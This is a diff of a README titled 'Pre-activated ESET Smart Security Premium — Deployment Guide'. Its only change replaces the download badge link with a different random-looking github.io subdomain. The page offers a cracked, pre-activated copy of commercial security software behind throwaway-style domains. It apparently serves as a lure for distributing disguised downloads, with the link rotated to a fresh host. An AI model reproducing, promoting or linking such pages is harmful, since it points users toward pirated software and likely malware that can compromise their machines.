@@ -1,7 +1,7 @@
 # 🛡️ Pre-activated ESET Smart Security Premium — Deployment Guide
 
 ⬇️ **Download Tool**  
-[![Download](https://img.shields.io/badge/Download-ESET_Tool-green?style=for-the-badge&logo=eset)](https://esetsmar1secure1wek0.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-ESET_Tool-green?style=for-the-badge&logo=eset)](https://eset1smart1preactivinf0.github.io/.github/)
 
 ---
 
